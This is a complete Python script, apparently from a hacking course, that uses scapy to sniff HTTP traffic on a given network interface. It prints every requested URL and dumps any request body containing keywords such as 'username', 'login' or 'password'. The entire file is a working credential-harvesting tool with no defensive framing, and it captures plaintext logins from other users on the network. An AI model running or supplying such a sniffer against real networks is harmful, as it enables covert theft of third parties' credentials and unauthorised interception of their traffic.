#!/usr/bin/env python3

import scapy.all as scapy
import argparse
from scapy.layers import http


def get_argument():
    parse = argparse.ArgumentParser()
    parse.add_argument("-i", "--interface", dest="interface", help="Your interface name")
    options = parse.parse_args()
    return options
def sniff(interface):
    # prn, call back function every time each packet capture
    # store, we do not store data because data pressure  to the system
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword.encode() in load:
                    print(load)
                    break


options = get_argument()
sniff(options.interface)
